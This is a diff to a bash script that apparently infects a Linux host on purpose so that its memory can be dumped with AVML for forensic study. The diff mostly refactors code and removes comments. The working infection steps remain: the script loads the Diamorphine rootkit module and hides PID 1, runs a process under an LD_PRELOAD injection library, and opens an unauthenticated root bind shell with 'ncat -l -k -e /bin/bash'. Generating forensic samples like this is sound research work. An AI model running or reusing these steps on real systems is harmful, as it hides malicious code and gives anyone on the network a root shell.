@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
-# manage_infect – Infection & memory capture manager (rootkit+injection pre-built)
+
+# manage_infect - Infection & memory capture manager (rootkit+injection pre-built)
+
 set -e
 
 ROOTKIT_MODULE="diamorphine"
@@ -12,15 +14,14 @@ FLAG_ROOTKIT="/tmp/.rootkit_active"
 FLAG_INJECTION="/tmp/.injection_active"
 FLAG_BACKDOOR="/tmp/.backdoor_active"
 
-# AVML – prefer system binary, else download
 AVML_DOWNLOAD_DIR="$HOME/.local/bin"
 AVML_DOWNLOAD_PATH="$AVML_DOWNLOAD_DIR/avml"
 AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
-AVML_PATH=""   # will be set by ensure_avml
+AVML_PATH=""
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
-INJECT_LIB="$SCRIPT_DIR/assets/evil.so"
+MODULE_PATH="$SCRIPT_DIR/../assets/diamorphine.ko"
+INJECT_LIB="$SCRIPT_DIR/../assets/evil.so"
 
 # --- Helpers ---
 is_module_active() {
@@ -45,7 +46,7 @@ install_rootkit() {
     fi
 
     sudo insmod "$MODULE_PATH"
-    sudo kill -31 1   # hide PID 1
+    sudo kill -31 1
     touch "$FLAG_ROOTKIT"
     echo "[+] Rootkit loaded (pre-built)."
 }
@@ -58,29 +59,23 @@ install_injection() {
 
     if [ ! -f "$INJECT_LIB" ]; then
         echo "[!] Pre-built library missing from assets/evil.so"
-        echo "[!] Build it first with: gcc -shared -fPIC evil.c -o assets/evil.so"
         exit 1
     fi
 
-    # 1. Create the unique marker file with a recognisable magic string
     echo "INJECTION_MARKER_RAMble" > "$INJECTION_MARKER"
 
-    # 2. Launch the LD_PRELOAD-injected process (unchanged behaviour)
     LD_PRELOAD="$INJECT_LIB" /usr/bin/sleep 9999 &
     local sleep_pid=$!
     sleep 1
     echo "$sleep_pid" > "$SLEEP_PID_FILE"
     echo "[+] Code injected (LD_PRELOAD) into PID $sleep_pid"
 
-    # 3. Launch a sentinel process whose only job is keeping the marker
-    #    file open so linux.lsof.Lsof can see it in the memory dump.
     tail -f "$INJECTION_MARKER" >/dev/null 2>&1 &
     local tail_pid=$!
     echo "$tail_pid" > "$TAIL_PID_FILE"
     echo "[+] Marker sentinel PID $tail_pid holding $INJECTION_MARKER open"
 
     touch "$FLAG_INJECTION"
-    echo "[+] Injection active. Volatility linux.lsof.Lsof will see '$INJECTION_MARKER'."
 }
 
 install_backdoor() {
@@ -89,9 +84,7 @@ install_backdoor() {
         return 0
     fi
 
-    # Ensure no previous ncat is still bound
     sudo pkill -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true
-
     sudo apt install -y ncat 2>/dev/null
     sudo ncat -l -k -p $BACKDOOR_PORT -e /bin/bash &
     touch "$FLAG_BACKDOOR"
@@ -99,12 +92,11 @@ install_backdoor() {
 }
 
 clean_rootkit() {
-    # Try normal removal, then force
     sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || \
     [ -d "/sys/module/${ROOTKIT_MODULE}" ] && sudo rmmod --force "$ROOTKIT_MODULE" 2>/dev/null || true
 
     if [ -d "/sys/module/${ROOTKIT_MODULE}" ]; then
-        echo "[!] Rootkit module could not be removed – a reboot may be required."
+        echo "[!] Rootkit module could not be removed - a reboot may be required."
     else
         echo "[+] Rootkit removed."
     fi
@@ -112,38 +104,23 @@ clean_rootkit() {
 }
 
 clean_injection() {
-    # Kill the LD_PRELOAD-injected sleep process
-    if [ -f "$SLEEP_PID_FILE" ]; then
-        local pid
+    [ -f "$SLEEP_PID_FILE" ] && {
         pid=$(cat "$SLEEP_PID_FILE")
-        if ps -p "$pid" > /dev/null 2>&1; then
-            sudo kill "$pid" 2>/dev/null || true
-        fi
+        ps -p "$pid" > /dev/null 2>&1 && sudo kill "$pid" 2>/dev/null || true
         rm -f "$SLEEP_PID_FILE"
-    fi
-
-    # Kill the marker sentinel process
-    if [ -f "$TAIL_PID_FILE" ]; then
-        local tail_pid
+    }
+    [ -f "$TAIL_PID_FILE" ] && {
         tail_pid=$(cat "$TAIL_PID_FILE")
-        if ps -p "$tail_pid" > /dev/null 2>&1; then
-            kill "$tail_pid" 2>/dev/null || true
-        fi
+        ps -p "$tail_pid" > /dev/null 2>&1 && kill "$tail_pid" 2>/dev/null || true
         rm -f "$TAIL_PID_FILE"
-    fi
-
-    # Remove the marker file
-    rm -f "$INJECTION_MARKER"
-    rm -f "$FLAG_INJECTION"
+    }
+    rm -f "$INJECTION_MARKER" "$FLAG_INJECTION"
     echo "[+] Injection cleaned."
 }
 
 clean_backdoor() {
-    local pid
     pid=$(pgrep -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true)
-    if [ -n "$pid" ]; then
-        sudo kill -9 "$pid" 2>/dev/null || true
-    fi
+    [ -n "$pid" ] && sudo kill -9 "$pid" 2>/dev/null || true
     rm -f "$FLAG_BACKDOOR"
     echo "[+] Backdoor cleaned."
 }
@@ -163,21 +140,16 @@ active_components() {
 }
 
 ensure_avml() {
-    # 1. Check if avml is already installed via PATH
     if command -v avml &>/dev/null; then
         AVML_PATH="$(command -v avml)"
         echo "[*] Using system-installed avml: $AVML_PATH"
         return 0
     fi
-
-    # 2. If a previously downloaded binary exists, use that
     if [ -x "$AVML_DOWNLOAD_PATH" ]; then
         AVML_PATH="$AVML_DOWNLOAD_PATH"
         echo "[*] Using previously downloaded avml: $AVML_PATH"
         return 0
     fi
-
-    # 3. Download
     echo "[*] Downloading avml to $AVML_DOWNLOAD_PATH ..."
     mkdir -p "$AVML_DOWNLOAD_DIR"
     wget -q "$AVML_URL" -O "$AVML_DOWNLOAD_PATH"
@@ -189,8 +161,7 @@ ensure_avml() {
 capture_memory() {
     local out_dir="$1"
     ensure_avml
-    local timestamp
-    timestamp=$(date +%Y%m%d_%H%M%S)
+    local timestamp=$(date +%Y%m%d_%H%M%S)
     local comps=( $(active_components) )
     local IFS=_
     local name="memdump_${timestamp}_${comps[*]}.raw"
@@ -211,18 +182,7 @@ show_status() {
 }
 
 # --- Main ---
-USAGE="Usage: $0 [-i [components] | -c [components] | -s] [-a [output_dir]]
-  -i        Infect (components: rootkit,injection,backdoor | 'all' default)
-  -c        Clean  (components as above)
-  -s        Status
-  -a        Capture memory with AVML, optionally specify output directory (default: current)
-Examples:
-  $0 -i rootkit -a /tmp/dumps
-  $0 -i -a       (infect all, dump in current dir)
-  $0 -c injection
-  $0 -c          (clean all)
-Note: when using -i or -c with -a, put -a before the components list, e.g.:
-  $0 -i -a /path injection,backdoor"
+USAGE="Usage: $0 [-i [components] | -c [components] | -s] [-a [output_dir]]"
 
 ACTION=""
 CAPTURE=false
@@ -235,56 +195,42 @@ while getopts "icsa" opt; do
         c) ACTION="clean";;
         s) ACTION="status";;
         a) CAPTURE=true
-           if [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]]; then
-               OUTPUT_DIR="${!OPTIND}"
-               OPTIND=$((OPTIND+1))
-           fi
-           ;;
+           [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]] && { OUTPUT_DIR="${!OPTIND}"; OPTIND=$((OPTIND+1)); };;
         *) echo "$USAGE"; exit 1;;
     esac
 done
-
 shift $((OPTIND-1))
 
-# Remaining arguments: if action is infect/clean and a non-option argument exists, treat as components
-if [ "$ACTION" = "infect" ] || [ "$ACTION" = "clean" ]; then
-    if [ $# -gt 0 ] && [[ "$1" != -* ]]; then
-        COMPONENTS="$1"
-        shift
-    fi
-fi
-
-if [ -z "$ACTION" ]; then
-    echo "$USAGE"
-    exit 1
-fi
+[ "$ACTION" = "infect" ] || [ "$ACTION" = "clean" ] && {
+    [ $# -gt 0 ] && [[ "$1" != -* ]] && { COMPONENTS="$1"; shift; }
+}
+[ -z "$ACTION" ] && { echo "$USAGE"; exit 1; }
 
 COMP_LIST=$(parse_components "$COMPONENTS")
 
-if [ "$ACTION" = "status" ]; then
-    show_status
-elif [ "$ACTION" = "infect" ]; then
-    for comp in $COMP_LIST; do
-        case $comp in
-            rootkit)   install_rootkit;;
-            injection) install_injection;;
-            backdoor)  install_backdoor;;
-            *) echo "Unknown component: $comp"; exit 1;;
-        esac
-    done
-    echo "[+] Infection complete."
-elif [ "$ACTION" = "clean" ]; then
-    for comp in $COMP_LIST; do
-        case $comp in
-            rootkit)   clean_rootkit;;
-            injection) clean_injection;;
-            backdoor)  clean_backdoor;;
-            *) echo "Unknown component: $comp"; exit 1;;
-        esac
-    done
-    echo "[+] Cleanup complete."
-fi
+case $ACTION in
+    status)
+        show_status;;
+    infect)
+        for comp in $COMP_LIST; do
+            case $comp in
+                rootkit)   install_rootkit;;
+                injection) install_injection;;
+                backdoor)  install_backdoor;;
+                *) echo "Unknown component: $comp"; exit 1;;
+            esac
+        done
+        echo "[+] Infection complete.";;
+    clean)
+        for comp in $COMP_LIST; do
+            case $comp in
+                rootkit)   clean_rootkit;;
+                injection) clean_injection;;
+                backdoor)  clean_backdoor;;
+                *) echo "Unknown component: $comp"; exit 1;;
+            esac
+        done
+        echo "[+] Cleanup complete.";;
+esac
 
-if $CAPTURE; then
-    capture_memory "$OUTPUT_DIR"
-fi
+$CAPTURE && capture_memory "$OUTPUT_DIR"
